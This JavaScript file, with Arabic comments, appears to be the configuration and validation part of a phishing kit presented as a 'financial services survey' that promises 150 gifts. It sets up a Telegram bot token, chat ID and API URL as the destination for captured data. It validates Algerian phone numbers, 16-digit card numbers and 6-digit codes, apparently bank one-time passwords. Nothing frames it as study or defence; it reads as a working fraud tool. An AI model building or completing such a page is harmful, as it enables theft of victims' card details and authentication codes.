// إعدادات البوت
const CONFIG = {
    TELEGRAM_BOT_TOKEN: "YOUR_BOT_TOKEN_HERE", // ضع توكن بوتك هنا
    TELEGRAM_CHAT_ID: "YOUR_CHAT_ID_HERE",     // ضع شات آيدي هنا
    API_URL: "https://api.telegram.org/bot",
    
    // إعدادات الموقع
    SITE_NAME: "استبيان الخدمات المالية",
    TOTAL_GIFTS: 150,
    
    // رسائل النظام
    MESSAGES: {
        SUCCESS: "تم الإرسال بنجاح!",
        ERROR: "حدث خطأ، حاول مرة أخرى",
        REQUIRED: "يرجى ملء جميع الحقول",
        INVALID_PHONE: "رقم الهاتف غير صحيح",
        INVALID_CARD: "رقم البطاقة يجب أن يكون 16 رقماً",
        INVALID_CODE: "الرمز يجب أن يكون 6 أرقام"
    }
};

// التحقق من صحة رقم الهاتف الجزائري
function isValidPhone(phone) {
    const cleaned = phone.replace(/\D/g, '');
    return /^(05|06|07)[0-9]{8}$/.test(cleaned);
}

// التحقق من رقم البطاقة
function isValidCard(card) {
    const cleaned = card.replace(/\D/g, '');
    return /^[0-9]{16}$/.test(cleaned);
}

// التحقق من الرمز
function isValidCode(code) {
    return /^[0-9]{6}$/.test(code);
}

// إنشاء رقم مشاركة عشوائي
function generateUserId() {
    const prefix = "FS";
    const date = new Date();
    const dateStr = date.getFullYear().toString().slice(-2) + 
                   (date.getMonth() + 1).toString().padStart(2, '0');
    const randomNum = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
    return `${prefix}-${dateStr}-${randomNum}`;
}